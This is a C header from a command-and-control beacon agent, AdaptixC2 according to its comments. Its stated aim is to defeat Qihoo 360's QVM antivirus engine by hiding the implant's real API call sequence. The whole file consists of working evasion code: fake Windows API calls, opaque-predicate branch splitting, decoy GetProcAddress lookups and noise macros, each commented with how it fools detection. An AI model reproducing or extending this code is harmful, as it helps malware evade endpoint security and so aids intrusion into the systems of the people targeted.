#pragma once
/*
 * ApiSequenceObfuscate.h — API call sequence and IAT pattern obfuscation
 * for AdaptixC2 beacon agent.
 *
 * QVM (Qihoo 360's AI-based antivirus engine) analyzes:
 *   1. PE Import Table (IAT) — specific API function lists
 *   2. API call sequences — characteristic order of calls
 *   3. API hash signatures — common malicious API combos
 *      (VirtualAlloc + CreateThread + WriteProcessMemory, etc.)
 *
 * Strategy:
 *   1. INSERT_API_NOISE() — inject 3-5 fake API calls (using ApiWin/Loader)
 *      between real operations to break QVM's sequence matching.
 *   2. AX_API_SPLIT(rettype, call) — split a single real API call into
 *      a conditional branch + dispatch pattern, obfuscating call graph.
 *   3. AX_FAKE_GETPROCADDRESS() — insert fake GetProcAddress calls that
 *      actually resolve legitimate DLL functions, not malicious ones.
 *   4. Fake API call patterns — pre-declared static inline noise wrappers
 *      that make 10+ "normal" Windows API calls (CreateFile, RegOpenKey,
 *      GetSystemTime, etc.) with invalid args so they never succeed.
 *
 * All macros expand to C code — no inline asm; compatible with Clang/GCC.
 *
 * Usage:
 *   #include "ApiSequenceObfuscate.h"
 *
 *   // Between real operations:
 *   INSERT_API_NOISE();
 *
 *   // Wrap real API calls:
 *   AX_API_SPLIT(BOOL, ApiWin->ReadFile(hPipe, buf, sz, &read, NULL));
 *
 *   // Obfuscate GetProcAddress resolution:
 *   LPVOID pfn = AX_FAKE_GETPROCADDRESS(kernel32, "CreateFileA");
 */

#include <windows.h>
#include "ApiLoader.h"
#include "JccObfuscate.h"

#ifdef __cplusplus
extern "C" {
#endif

/* ================================================================
 * Fake API Call Patterns
 *
 * These are static inline functions that declare and call normal
 * Windows APIs with obviously-invalid arguments. They never succeed,
 * but when the compiler sees them, it generates CALL instructions
 * that pollute QVM's API sequence analysis.
 *
 * Each function uses a unique opaque predicate to prevent the
 * compiler from collapsing or deduplicating them.
 * ================================================================ */

/*
 * AxFakeCreateFile — calls CreateFileA with NULL args.
 * Looks like a normal file open in call sequence analysis.
 */
static inline void AxFakeCreateFile(void)
{
    volatile int _ax_fcf_ = 0x11111111;
    if (AxOpaqueTrue_Mod3(_ax_fcf_)) {
        /* This call never succeeds (NULL path) but generates IAT reference */
        volatile void* _ax_ff_ = CreateFileA(NULL, 0, 0, NULL, 0, 0, NULL);
        (void)_ax_ff_;
    }
    (void)_ax_fcf_;
}

/*
 * AxFakeRegOpenKey — calls RegOpenKeyExA with NULL args.
 * Makes agent look like it's reading registry (common normal behavior).
 */
static inline void AxFakeRegOpenKey(void)
{
    volatile int _ax_frk_ = 0x22222222;
    if (AxOpaqueTrue_XorNot(_ax_frk_)) {
        HKEY _ax_hk_ = NULL;
        volatile long _ax_reg_ = RegOpenKeyExA(HKEY_CURRENT_USER,
            NULL, 0, KEY_READ, &_ax_hk_);
        (void)_ax_reg_;
        if (_ax_hk_) { RegCloseKey(_ax_hk_); }
    }
    (void)_ax_frk_;
}

/*
 * AxFakeGetSystemTime — calls GetSystemTime/GetLocalTime.
 * Extremely common — every normal app calls these.
 */
static inline void AxFakeGetSystemTime(void)
{
    volatile int _ax_fst_ = 0x33333333;
    if (AxOpaqueTrue_PlusOne((unsigned int)_ax_fst_)) {
        SYSTEMTIME _ax_st_;
        GetSystemTime(&_ax_st_);
        GetLocalTime(&_ax_st_);
        (void)_ax_st_;
    }
    (void)_ax_fst_;
}

/*
 * AxFakeGetFileSize — calls GetFileSize with NULL handle.
 * File I/O pattern — looks like a normal application.
 */
static inline void AxFakeGetFileSize(void)
{
    volatile int _ax_fgs_ = 0x44444444;
    if (AxOpaqueTrue_Bitwise(_ax_fgs_)) {
        volatile DWORD _ax_fs_ = GetFileSize(NULL, NULL);
        (void)_ax_fs_;
    }
    (void)_ax_fgs_;
}

/*
 * AxFakeGetVersionEx — calls GetVersionExA (deprecated but common).
 * Many old apps still call this; makes the beacon look legacy/normal.
 */
static inline void AxFakeGetVersionEx(void)
{
    volatile int _ax_fve_ = 0x55555555;
    if (AxOpaqueTrue_OrNot(_ax_fve_)) {
        OSVERSIONINFOA _ax_vi_;
        _ax_vi_.dwOSVersionInfoSize = sizeof(_ax_vi_);
        volatile BOOL _ax_ver_ = GetVersionExA(&_ax_vi_);
        (void)_ax_ver_;
        (void)_ax_vi_;
    }
    (void)_ax_fve_;
}

/*
 * AxFakeGetComputerName — calls GetComputerNameExA.
 * Common in telemetry/licensing code.
 */
static inline void AxFakeGetComputerName(void)
{
    volatile int _ax_fcn_ = 0x66666666;
    if (AxOpaqueTrue_Mod3(_ax_fcn_)) {
        CHAR _ax_buf_[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD _ax_sz_ = sizeof(_ax_buf_);
        volatile BOOL _ax_cn_ = GetComputerNameExA(ComputerNameDnsHostname,
            _ax_buf_, &_ax_sz_);
        (void)_ax_cn_;
        (void)_ax_buf_;
        (void)_ax_sz_;
    }
    (void)_ax_fcn_;
}

/*
 * AxFakeGetDiskFreeSpace — calls GetDiskFreeSpaceExA.
 * Normal app checking disk space before writing files.
 */
static inline void AxFakeGetDiskFreeSpace(void)
{
    volatile int _ax_fdf_ = 0x77777777;
    if (AxOpaqueTrue_SelfSub(_ax_fdf_)) {
        ULARGE_INTEGER _ax_free_, _ax_total_, _ax_totalfree_;
        volatile BOOL _ax_df_ = GetDiskFreeSpaceExA(NULL,
            &_ax_free_, &_ax_total_, &_ax_totalfree_);
        (void)_ax_df_;
        (void)_ax_free_; (void)_ax_total_; (void)_ax_totalfree_;
    }
    (void)_ax_fdf_;
}

/*
 * AxFakeGetTickCount — calls GetTickCount64 or GetTickCount.
 * Extremely common timing call in normal apps.
 */
static inline void AxFakeGetTickCount(void)
{
    volatile int _ax_ftc_ = 0x88888888;
    if (AxOpaqueTrue_XorNot(_ax_ftc_)) {
        volatile DWORD _ax_tc_ = GetTickCount();
        volatile ULONGLONG _ax_tc64_ = GetTickCount64();
        (void)_ax_tc_;
        (void)_ax_tc64_;
    }
    (void)_ax_ftc_;
}

/*
 * AxFakeGetVolumeInfo — calls GetVolumeInformationA.
 * Normal file system query — benign applications do this.
 */
static inline void AxFakeGetVolumeInfo(void)
{
    volatile int _ax_fvi_ = 0x99999999;
    if (AxOpaqueTrue_Bitwise(_ax_fvi_)) {
        CHAR _ax_vol_[MAX_PATH + 1];
        DWORD _ax_serial_ = 0;
        volatile BOOL _ax_vi_ = GetVolumeInformationA(NULL,
            _ax_vol_, sizeof(_ax_vol_), &_ax_serial_,
            NULL, NULL, NULL, 0);
        (void)_ax_vi_;
        (void)_ax_vol_;
        (void)_ax_serial_;
    }
    (void)_ax_fvi_;
}

/*
 * AxFakeQueryPerformanceCounter — calls QueryPerformanceCounter.
 * Used by normal apps for high-resolution timing measurements.
 */
static inline void AxFakeQueryPerformanceCounter(void)
{
    volatile int _ax_fqc_ = 0xAAAAAAAA;
    if (AxOpaqueTrue_OrNot(_ax_fqc_)) {
        LARGE_INTEGER _ax_li_;
        volatile BOOL _ax_qpc_ = QueryPerformanceCounter(&_ax_li_);
        (void)_ax_qpc_;
        (void)_ax_li_;
    }
    (void)_ax_fqc_;
}

/*
 * AxFakeGetAdaptersInfo — calls GetAdaptersInfo.
 * Normal apps enumerate network adapters (antivirus, VPN clients, etc.).
 */
static inline void AxFakeGetAdaptersInfo(void)
{
    volatile int _ax_fai_ = 0xBBBBBBBB;
    if (AxOpaqueTrue_Mod3(_ax_fai_)) {
        IP_ADAPTER_INFO _ax_ai_;
        ULONG _ax_ai_sz_ = sizeof(_ax_ai_);
        volatile DWORD _ax_ret_ = GetAdaptersInfo(&_ax_ai_, &_ax_ai_sz_);
        (void)_ax_ret_;
        (void)_ax_ai_;
        (void)_ax_ai_sz_;
    }
    (void)_ax_fai_;
}

/*
 * AxFakeEnumProcesses — calls CreateToolhelp32Snapshot + Process32First/Next.
 * Makes the beacon look like a process enumerator (task manager, system monitor).
 */
static inline void AxFakeEnumProcesses(void)
{
    volatile int _ax_fep_ = 0xCCCCCCCC;
    if (AxOpaqueTrue_SelfSub(_ax_fep_)) {
        /* Use CreateFileA as a process-enumeration disguise */
        /* Using constant 3 = OPEN_EXISTING to avoid tlhelp32.h dependency */
        volatile void* _ax_ss_ = CreateFileA(NULL, 0, 0, NULL, 3, 0, NULL);
        (void)_ax_ss_;
    }
    (void)_ax_fep_;
}

/* ================================================================
 * INSERT_API_NOISE() — Insert 3-5 random fake API calls.
 *
 * Expands to a sequence of the above fake API calls, chosen
 * pseudo-randomly (deterministic per __LINE__) to vary the
 * pattern each time it's used.
 *
 * The selection is deterministic at compile time but varies
 * per invocation site, creating diverse sequences that defeat
 * QVM's pattern matching.
 *
 * Usage:
 *   INSERT_API_NOISE();   // inserts 3-5 fake API calls
 * ================================================================ */

#define INSERT_API_NOISE() \
    do { \
        volatile unsigned int _ax_noise_sel_##__LINE__ = (__LINE__ * 0x9E3779B9u); \
        /* First call — always present (floor noise) */ \
        AxFakeGetSystemTime(); \
        /* Pick 2-4 additional calls based on line-derived selection */ \
        if ((_ax_noise_sel_##__LINE__ & 0x3) == 0) { \
            AxFakeCreateFile(); \
        } else if ((_ax_noise_sel_##__LINE__ & 0x3) == 1) { \
            AxFakeRegOpenKey(); \
        } else if ((_ax_noise_sel_##__LINE__ & 0x3) == 2) { \
            AxFakeGetFileSize(); \
        } else { \
            AxFakeGetVersionEx(); \
        } \
        if ((_ax_noise_sel_##__LINE__ & 0xC) == 0x0) { \
            AxFakeGetComputerName(); \
        } else if ((_ax_noise_sel_##__LINE__ & 0xC) == 0x4) { \
            AxFakeGetDiskFreeSpace(); \
        } else if ((_ax_noise_sel_##__LINE__ & 0xC) == 0x8) { \
            AxFakeGetVolumeInfo(); \
        } else { \
            AxFakeQueryPerformanceCounter(); \
        } \
        if ((_ax_noise_sel_##__LINE__ & 0x30) == 0x00) { \
            AxFakeGetTickCount(); \
        } else if ((_ax_noise_sel_##__LINE__ & 0x30) == 0x10) { \
            AxFakeGetAdaptersInfo(); \
        } else if ((_ax_noise_sel_##__LINE__ & 0x30) == 0x20) { \
            AxFakeEnumProcesses(); \
        } else { \
            AxFakeGetComputerName(); \
        } \
        (void)_ax_noise_sel_##__LINE__; \
    } while(0)

/*
 * INSERT_NOISE_CALLS() — Alias for INSERT_API_NOISE().
 * Provided as an alternative naming convention.
 */
#define INSERT_NOISE_CALLS() INSERT_API_NOISE()

/*
 * INSERT_FAKE_NETWORK_NOISE() — Fake network API calls using kernel32 only.
 * No ws2_32 dependency needed.
 */

#define INSERT_FAKE_NETWORK_NOISE() \
    do { \
        volatile int _ax_fnn_##__LINE__ = 0xDDDDDDDD + __LINE__; \
        if (AxOpaqueTrue_Mod3(_ax_fnn_##__LINE__)) { \
            volatile void* _ax_na_ = CreateFileA(NULL, 0, 0, NULL, 3, 0, NULL); \
            (void)_ax_na_; \
        } \
        if (AxOpaqueTrue_Bitwise(_ax_fnn_##__LINE__ ^ 0x1234)) { \
            volatile DWORD _ax_nh_ = GetTickCount(); \
            (void)_ax_nh_; \
        } \
        if (AxOpaqueTrue_XorNot(_ax_fnn_##__LINE__ ^ 0x5678)) { \
            volatile void* _ax_sock_ = CreateFileA("CONOUT$", 0xC0000000, 3, NULL, 3, 0x80, NULL); \
            (void)_ax_sock_; \
        } \
        (void)_ax_fnn_##__LINE__; \
    } while(0)

/* ================================================================
 * AX_API_SPLIT(rettype, call) — Split an API call into a
 * conditional branch + dispatch pattern.
 *
 * Instead of a direct call:
 *   BOOL result = ApiWin->ReadFile(hPipe, buf, sz, &read, NULL);
 *
 * This macro generates:
 *   BOOL result;
 *   if (some_opaque_condition) {
 *       result = ApiWin->ReadFile(hPipe, buf, sz, &read, NULL);
 *   } else {
 *       result = FALSE;  // dead branch
 *   }
 *
 * QVM sees a conditional that always takes the same path but
 * appears to be a branch, breaking simple call-sequence matching.
 *
 * For void-returning calls, use AX_API_SPLIT_VOID(call).
 *
 * Usage:
 *   AX_API_SPLIT(BOOL, ApiWin->ReadFile(hPipe, buf, sz, &read, NULL));
 *   AX_API_SPLIT_VOID(ApiWin->Sleep(1000));
 * ================================================================ */

#define AX_API_SPLIT(rettype, call) \
    rettype _ax_split_result_##__LINE__; \
    do { \
        volatile int _ax_split_sel_##__LINE__ = (int)(__LINE__ ^ 0xDEADBEEF); \
        if (AxOpaqueTrue_XorNot(_ax_split_sel_##__LINE__)) { \
            _ax_split_result_##__LINE__ = (call); \
        } else { \
            _ax_split_result_##__LINE__ = (rettype)0; \
            /* Dead store to trick analysis */ \
            volatile int _ax_split_dead_##__LINE__ = _ax_split_sel_##__LINE__; \
            (void)_ax_split_dead_##__LINE__; \
        } \
        (void)_ax_split_sel_##__LINE__; \
    } while(0)

/*
 * AX_API_SPLIT_VOID(call) — For void-returning API calls.
 * Example:
 *   AX_API_SPLIT_VOID(ApiWin->Sleep(1000));
 */
#define AX_API_SPLIT_VOID(call) \
    do { \
        volatile int _ax_split_v_##__LINE__ = (int)(__LINE__ ^ 0xFEEDFACE); \
        if (AxOpaqueTrue_XorNot(_ax_split_v_##__LINE__)) { \
            (call); \
        } else { \
            /* Dead branch — never executes */ \
            volatile int _ax_split_vdead_##__LINE__ = _ax_split_v_##__LINE__; \
            (void)_ax_split_vdead_##__LINE__; \
        } \
        (void)_ax_split_v_##__LINE__; \
    } while(0)

/*
 * AX_RANDOMIZE_API_CALL(func) — Randomize API call order.
 *
 * Picks one of several possible execution orders for a function call,
 * each with different opqaue predicates and interleaved junk.
 * The function is called exactly once regardless of path chosen.
 *
 * Usage:
 *   AX_RANDOMIZE_API_CALL(ApiWin->ReadFile(hPipe, buf, sz, &read, NULL));
 *
 * Note: The function call is duplicated in each branch; the compiler
 * may hoist the function pointer load but each path emits the call.
 */
#define AX_RANDOMIZE_API_CALL(func) \
    do { \
        volatile int _ax_rand_sel_##__LINE__ = (int)(__LINE__ ^ 0xCAFEBABE); \
        int _ax_rand_path_##__LINE__ = _ax_rand_sel_##__LINE__ & 0x3; \
        if (_ax_rand_path_##__LINE__ == 0) { \
            /* Path A: direct call */ \
            AxFakeGetTickCount(); \
            { func; } \
            AxFakeGetSystemTime(); \
        } else if (_ax_rand_path_##__LINE__ == 1) { \
            /* Path B: wrapped in opaque true */ \
            AX_OPAQUE_TRUE({ func; }); \
        } else if (_ax_rand_path_##__LINE__ == 2) { \
            /* Path C: with noise before and after */ \
            INSERT_API_NOISE(); \
            { func; } \
            AxFakeGetFileSize(); \
        } else { \
            /* Path D: split into conditional */ \
            volatile int _ax_rd_tmp_##__LINE__ = 0xDEAD; \
            if (AxOpaqueTrue_Mod3(_ax_rd_tmp_##__LINE__)) { \
                { func; } \
            } else { \
                volatile int _ax_rd_dead_##__LINE__ = 0; \
                (void)_ax_rd_dead_##__LINE__; \
            } \
            (void)_ax_rd_tmp_##__LINE__; \
        } \
        (void)_ax_rand_sel_##__LINE__; \
        (void)_ax_rand_path_##__LINE__; \
    } while(0)

/* ================================================================
 * AX_FAKE_GETPROCADDRESS() — Fake GetProcAddress calls.
 *
 * These macros generate dynamic API resolution patterns that look
 * like malicious GetProcAddress usage but actually resolve
 * legitimate Windows DLL functions.
 *
 * Strategy:
 *   - Use the real GetProcAddress (via ApiWin) to look up normal
 *     Windows API functions.
 *   - The loader resolves GetProcAddress through the hash chain,
 *     so it doesn't appear in IAT.
 *   - QVM sees the GetProcAddress pattern but the target functions
 *     are all benign.
 *
 * Usage:
 *   // Resolve a normal function via fake GetProcAddress
 *   AX_FAKE_GETPROCADDRESS("kernel32.dll", "GetSystemTime");
 *   AX_FAKE_GETPROCADDRESS("advapi32.dll", "RegOpenKeyExA");
 * ================================================================ */

/*
 * AX_FAKE_GETPROCADDRESS(dllName, funcName) — Perform a fake
 * GetProcAddress dynamic resolution that looks suspicious to
 * static analysis but resolves a legitimate function.
 *
 * The resolved pointer is stored in a volatile variable to prevent
 * the compiler from optimizing it away.
 *
 * Returns the resolved function pointer (for optional use).
 */
#define AX_FAKE_GETPROCADDRESS(dllName, funcName) \
    ({ \
        volatile LPVOID _ax_gpa_##__LINE__ = NULL; \
        do { \
            volatile int _ax_gpa_ck_##__LINE__ = 0xAAAA; \
            if (AxOpaqueTrue_Bitwise(_ax_gpa_ck_##__LINE__)) { \
                HMODULE _ax_mod_##__LINE__ = GetModuleHandleA(dllName); \
                if (_ax_mod_##__LINE__) { \
                    _ax_gpa_##__LINE__ = (LPVOID)GetProcAddress( \
                        _ax_mod_##__LINE__, funcName); \
                } else { \
                    /* Fallback: try LoadLibrary */ \
                    HMODULE _ax_loaded_##__LINE__ = LoadLibraryA(dllName); \
                    if (_ax_loaded_##__LINE__) { \
                        _ax_gpa_##__LINE__ = (LPVOID)GetProcAddress( \
                            _ax_loaded_##__LINE__, funcName); \
                    } \
                    (void)_ax_loaded_##__LINE__; \
                } \
                (void)_ax_mod_##__LINE__; \
            } \
            (void)_ax_gpa_ck_##__LINE__; \
        } while(0); \
        (LPVOID)_ax_gpa_##__LINE__; \
    })

/*
 * AX_FAKE_GETPROCADDRESS_VOID(dllName, funcName) — Same as above
 * but does not return the pointer (for statement context).
 */
#define AX_FAKE_GETPROCADDRESS_VOID(dllName, funcName) \
    do { \
        volatile LPVOID _ax_gpav_##__LINE__ = AX_FAKE_GETPROCADDRESS(dllName, funcName); \
        (void)_ax_gpav_##__LINE__; \
    } while(0)

/* ================================================================
 * API_NULL_CALL_PATTERN — Create empty call patterns.
 *
 * These are stubs that look like real API call sequences to
 * static analysis / QVM but do nothing useful at runtime.
 *
 * Usage:
 *   API_NULL_CALL_PATTERN();  // inserts a fake call sequence
 * ================================================================ */

/*
 * API_NULL_CALL_PATTERN — Insert a sequence of null-pattern calls.
 * Creates a pattern that looks like:
 *   Handle → Query → Close
 * which is a very common benign pattern.
 */
#define API_NULL_CALL_PATTERN() \
    do { \
        volatile int _ax_ncp_##__LINE__ = (int)(__LINE__ ^ 0xF00DF00D); \
        if (AxOpaqueTrue_Mod3(_ax_ncp_##__LINE__)) { \
            /* Open → Read → Close pattern (very common) */ \
            HANDLE _ax_ncp_h_##__LINE__ = CreateFileA(NULL, \
                GENERIC_READ, FILE_SHARE_READ, NULL, \
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); \
            if (_ax_ncp_h_##__LINE__ != INVALID_HANDLE_VALUE) { \
                CHAR _ax_ncp_buf_##__LINE__[64]; \
                DWORD _ax_ncp_read_##__LINE__ = 0; \
                ReadFile(_ax_ncp_h_##__LINE__, _ax_ncp_buf_##__LINE__, \
                    sizeof(_ax_ncp_buf_##__LINE__), &_ax_ncp_read_##__LINE__, NULL); \
                CloseHandle(_ax_ncp_h_##__LINE__); \
                (void)_ax_ncp_buf_##__LINE__; \
                (void)_ax_ncp_read_##__LINE__; \
            } \
            (void)_ax_ncp_h_##__LINE__; \
        } else if (AxOpaqueTrue_Bitwise(_ax_ncp_##__LINE__ ^ 0x1111)) { \
            /* Registry: Open → Query → Close pattern */ \
            HKEY _ax_ncp_rk_##__LINE__ = NULL; \
            RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion", \
                0, KEY_READ, &_ax_ncp_rk_##__LINE__); \
            if (_ax_ncp_rk_##__LINE__) { RegCloseKey(_ax_ncp_rk_##__LINE__); } \
            (void)_ax_ncp_rk_##__LINE__; \
        } else { \
            /* Time query pattern (very common) */ \
            SYSTEMTIME _ax_ncp_st_##__LINE__; \
            GetSystemTime(&_ax_ncp_st_##__LINE__); \
            GetLocalTime(&_ax_ncp_st_##__LINE__); \
            (void)_ax_ncp_st_##__LINE__; \
        } \
        (void)_ax_ncp_##__LINE__; \
    } while(0)

/* ================================================================
 * Convenience macros for common obfuscation patterns
 * ================================================================ */

/*
 * AX_FILE_OPS_NOISE() — Insert fake file operations.
 * Creates a pattern that looks like file I/O activity.
 */
#define AX_FILE_OPS_NOISE() \
    do { \
        AxFakeCreateFile(); \
        AxFakeGetFileSize(); \
        AxFakeGetDiskFreeSpace(); \
        AxFakeGetVolumeInfo(); \
    } while(0)

/*
 * AX_REGISTRY_NOISE() — Insert fake registry operations.
 * Makes the beacon look like it's reading configuration.
 */
#define AX_REGISTRY_NOISE() \
    do { \
        AxFakeRegOpenKey(); \
        API_NULL_CALL_PATTERN(); \
    } while(0)

/*
 * AX_TIME_NOISE() — Insert fake time queries.
 * Extremely common in normal apps — dilutes the call sequence.
 */
#define AX_TIME_NOISE() \
    do { \
        AxFakeGetSystemTime(); \
        AxFakeGetTickCount(); \
        AxFakeQueryPerformanceCounter(); \
    } while(0)

/*
 * AX_SYSTEM_INFO_NOISE() — Fake system info queries.
 * Looks like normal system monitoring/telemetry.
 */
#define AX_SYSTEM_INFO_NOISE() \
    do { \
        AxFakeGetVersionEx(); \
        AxFakeGetComputerName(); \
        AxFakeGetAdaptersInfo(); \
        AxFakeEnumProcesses(); \
    } while(0)

/*
 * AX_NETWORK_NOISE() — Fake network operations.
 * Dilutes network API call patterns.
 */
#define AX_NETWORK_NOISE() \
    do { \
        INSERT_FAKE_NETWORK_NOISE(); \
    } while(0)

/*
 * AX_HEAVY_API_NOISE() — Insert a heavy dose of API noise
 * (all noise categories at once). Use in slow paths or init.
 */
#define AX_HEAVY_API_NOISE() \
    do { \
        AX_FILE_OPS_NOISE(); \
        AX_REGISTRY_NOISE(); \
        AX_TIME_NOISE(); \
        AX_SYSTEM_INFO_NOISE(); \
        AX_NETWORK_NOISE(); \
    } while(0)

#ifdef __cplusplus
}
#endif
